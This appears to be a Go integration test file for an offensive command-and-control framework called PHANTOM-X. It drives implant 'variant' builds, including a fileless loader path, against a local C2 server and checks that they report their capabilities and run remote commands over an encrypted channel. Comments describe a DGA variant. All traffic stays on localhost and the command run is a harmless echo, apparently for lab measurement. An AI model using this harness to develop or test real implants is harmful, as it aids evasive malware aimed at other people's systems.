// =============================================================================
// PHANTOM-X :: Phase 5 -- variant integration tests
// =============================================================================
// variants_test.go -- Drives the variant builds against the Go server.
//
// WHAT THIS PROVES
//     Each variant is a separate build with a separate wire behaviour.
//     A test that only exercised the baseline would pass whether or not
//     the variant code worked at all, so each variant gets its own
//     check.
//
//     The encrypted-channel test is the important one: the payload and
//     the server derive the keystream independently, in two different
//     languages, from the same key. If the two implementations disagree
//     by a single byte the session dies at the first frame, so a
//     successful session IS the proof that they agree.
//
// RUN
//     go test -v -run TestVariants -payload <path to variant binary> .
// =============================================================================

package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// flagVariant points at the variant build.
var flagVariant = flag.String("variant", "", "path to the variant payload binary")

// findVariant locates the variant build.
func findVariant(t *testing.T) string {
	t.Helper()
	if p := *flagVariant; p != "" {
		abs, err := filepathAbs(p)
		if err != nil {
			t.Fatalf("cannot resolve %q: %v", p, err)
		}
		if _, err := os.Stat(abs); err != nil {
			t.Fatalf("variant payload not found: %s", abs)
		}
		return abs
	}
	for _, rel := range []string{
		"..\\phase3_fileless\\loader\\px_variant.exe",
		"..\\dist\\native\\px_variant.exe",
	} {
		abs, _ := filepathAbs(rel)
		if _, err := os.Stat(abs); err == nil {
			return abs
		}
	}
	t.Skip("no variant payload found; build one with -variant <path>")
	return ""
}

// TestVariantCapabilities checks that the variant build reports its
// capabilities and that the server records them.
//
// The CAPS report is what makes a baseline session distinguishable from
// a variant session in the audit log, and therefore what makes the
// comparison between them possible. If it is missing or wrong, every
// measurement the lab takes is unattributable.
//
// NOTE ON THE DGA
//     A build with the domain generation variant compiled in resolves a
//     generated hostname, which does not resolve unless the lab's DNS
//     helper is running. The PX_C2_HOST override does NOT help: the DGA
//     replaces the host after the override is read. So the DGA needs
//     its own test with the DNS helper, and the other variants are
//     tested here.
func TestVariantCapabilities(t *testing.T) {
	payload := findVariant(t)
	port := 9411
	workdir := t.TempDir()
	logpath := workdir + "/caps.jsonl"

	srv := newServer("127.0.0.1", port, logpath, false, 0)
	ln, err := listenLocal(port)
	if err != nil {
		t.Fatalf("cannot bind: %v", err)
	}
	defer ln.Close()
	go srv.acceptLoop(ln)
	defer srv.shutdown()
	time.Sleep(300 * time.Millisecond)

	cmd := exec.Command(payload)
	cmd.Env = append(os.Environ(),
		"PX_C2_HOST=127.0.0.1",
		fmt.Sprintf("PX_C2_PORT=%d", port),
	)
	if err := cmd.Start(); err != nil {
		t.Fatalf("cannot start payload: %v", err)
	}
	defer func() {
		cmd.Process.Kill()
		cmd.Wait()
	}()

	sess := waitForSession(srv, 30*time.Second)
	if sess == nil {
		t.Fatal("variant payload never established a session")
	}

	// The CAPS line arrives after HELLO. Wait for it.
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if sess.capReported {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if !sess.capReported {
		t.Fatal("the variant payload did not report its capabilities")
	}

	// A mask of zero is a valid answer: it is what the BASELINE arm
	// reports, and it is exactly what the audit log needs in order to
	// tell a baseline session from a variant one.
	t.Logf("variant reported: 0x%02x (%s)", sess.capabilities, sess.capSummary)

	// Every capability bit must have a readable name. A mask with no
	// name is useless in an audit log months later.
	names := CapabilityNames(sess.capabilities)
	if sess.capabilities != 0 && len(names) == 0 {
		t.Fatalf("capability mask 0x%02x produced no names", sess.capabilities)
	}
	t.Logf("capability names: %v", names)
}

// TestVariantEncryptedChannel drives the encrypted-channel variant.
//
// This is the cross-implementation check: the payload is C and the
// server is Go, and the two derive the keystream independently from the
// same key. A successful session means they agree byte for byte.
func TestVariantEncryptedChannel(t *testing.T) {
	payload := findVariant(t)
	port := 9412
	workdir := t.TempDir()
	logpath := workdir + "/enc.jsonl"

	srv := newServer("127.0.0.1", port, logpath, false, 0)
	ln, err := listenLocal(port)
	if err != nil {
		t.Fatalf("cannot bind: %v", err)
	}
	defer ln.Close()
	go srv.acceptLoop(ln)
	defer srv.shutdown()
	time.Sleep(300 * time.Millisecond)

	cmd := exec.Command(payload)
	cmd.Env = append(os.Environ(),
		"PX_C2_HOST=127.0.0.1",
		fmt.Sprintf("PX_C2_PORT=%d", port),
	)
	if err := cmd.Start(); err != nil {
		t.Fatalf("cannot start payload: %v", err)
	}
	defer func() {
		cmd.Process.Kill()
		cmd.Wait()
	}()

	sess := waitForSession(srv, 30*time.Second)
	if sess == nil {
		t.Fatal("encrypted variant never established a session")
	}

	// The CAPS line has to be processed before anything else is sent.
	//
	// The server only sets up the keystreams when it reads the CAPS
	// report, so a command sent before that would go out in the clear
	// to a payload that is already expecting frames. The session would
	// then be stuck: the payload would wait for a frame and the server
	// would be waiting for a line.
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if sess.capReported {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if !sess.capReported {
		t.Fatal("the variant payload did not report its capabilities")
	}
	if sess.capabilities&CapEncrypted == 0 {
		t.Skipf("this variant build does not have the encrypted channel "+
			"(mask=0x%02x)", sess.capabilities)
	}

	// A command round trip over the encrypted channel. The payload
	// executes it and the reply comes back through the same cipher.
	res := srv.exec(sess, "cmd /c echo PHANTOM_X_ENCRYPTED_PROOF", 30*time.Second)
	if res == nil {
		t.Fatal("EXEC over the encrypted channel timed out")
	}
	if !contains(res.Output, "PHANTOM_X_ENCRYPTED_PROOF") {
		t.Fatalf("encrypted round trip returned the wrong output: %q", res.Output)
	}
	t.Logf("encrypted round trip OK: %q", res.Output)
}

// contains is a tiny substring helper, so the test does not need the
// strings package for one call.
func contains(haystack, needle string) bool {
	return strings.Contains(haystack, needle)
}

// filepathAbs is filepath.Abs, wrapped so the test file does not need
// the import in two places.
func filepathAbs(p string) (string, error) {
	return filepath.Abs(p)
}
